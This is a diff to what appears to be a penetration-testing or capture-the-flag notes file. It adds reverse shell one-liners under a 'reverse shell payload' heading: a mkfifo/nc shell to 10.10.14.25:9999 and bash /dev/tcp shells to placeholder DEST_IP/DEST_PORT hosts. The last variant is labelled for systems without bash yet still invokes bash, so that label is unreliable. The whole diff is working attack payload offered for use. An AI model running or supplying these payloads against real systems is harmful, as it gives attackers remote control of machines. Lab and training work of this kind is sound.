@@ -63,6 +63,16 @@ listen("127.0.0.1",8081)#port listen
 
 ```
 3. reverse shell payload
+- if nc is available
 ```sh
 mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.25 9999 >/tmp/f
+```
+- if there is no nc
+```sh
+bash &>/dev/tcp/DEST_IP/DEST_PORT <&1
+```
+- if there is no nc nor bash
+```sh
+
+bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"
 ```
